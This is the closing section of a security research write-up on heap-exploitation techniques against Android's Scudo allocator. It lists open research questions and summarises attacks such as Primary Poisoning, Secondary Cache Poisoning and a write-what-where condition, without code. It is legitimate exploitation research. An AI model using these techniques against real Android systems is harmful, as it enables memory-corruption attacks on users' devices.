In this section, unanswered questions and unsolved problems are listed for future work! Either they seemed to hard at first glance or were considered "useless" at that point in time.

1. Evaluate integer underflow in [primary poisoning](#fake-chunk-mispositioning). It somehow feels like there has to be more that can be done...
2. Evaluate [`getBlockBegin`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=1116;drc=b45a2ea782074944f79fc388df20b06e01f265f7). To be precise: how can the `Offset` field be used? Memory probing??
3. Attack: Primary fake chunk creation to construct predictable order and locations of primary chunks. I.e. calling `free` repeatedly for consecutive memory allows to fill up `C->Chunks` in non - shuffled fashion! Problem: strong assumptions
4. Evaluate integer underflow caused by calling `DoublyLinkedList::remove` with `X->Next = X->Prev = X`. Maybe side channel?? (very unlikely, but would be funny). `DoublyLinkedList::Size` impacts `DoublyLinkedList::empty()`, which impacts `scudo_malloc_info`. Might be useful to confuse programs...
5. What happens if the quarantine and memory tagging are enabled? How does that impact the proposed attacks?
6. It seems to be possible to render the secondary cache useless by freeing fake chunks with `CommitSize = <size smaller than primary sizes>` and `CommitBase != nullptr`, as we **dont** have control over the `ClassId` field for `scudo_malloc` calls. This could enforce secondary allocations to use `mmap` and `munmap`. This might be limited by the fact that the cache can be emptied if it is full.
7. Evaluate attacks on randomness as regards chunk ordering in the primary. It suffices to know that two chunks in a chunk array are consecutive in terms of array positioning and memory location. Dissolving the entire shuffling of a chunks array would be amazing, but way too much. If we knew that the next to calls to `malloc` result in two successive chunks in terms of memory location, then we could trigger a behaviour that again triggers a buffer overflow w.r.t. the two chunks. If we only had an oracle that tells us whether the next two calls to `malloc` return successive chunks in memory, then we could test for this property and if its not given, then perform a (maybe random) sequence of `malloc` and `free` calls to "shuffle" the array. Then repeat.

## Summary

We have seen different kinds of attacks on vulnerabilities that involve *Scudo*. To be precise, we have seen two types of fake chunk creation, namely [*Primary Poisoning*](#primary-poisoning) and [*Secondary Cache Poisoning*](#secondary-cache-poisoning), as well as a [*Write - What - Where* condition](#neat-little-side-effect), which was a side effect of *Secondary Cache Poisoning*. Finally, heap overflows into chunk meta data have been discussed.

Overall, we can say that with strong enough assumptions, i.e. leak of a pointer and a combined header, and presence of a *Scudo* - related vulnerability, we can perform similar attacks to those applicable to e.g. *dlmalloc*. Currently, the main assumption is the leak in order to break the checksum. Further analysis is required to determine whether this leak is a globally minimal assumption, or whether the assumption can be dropped or replaced by a weaker one.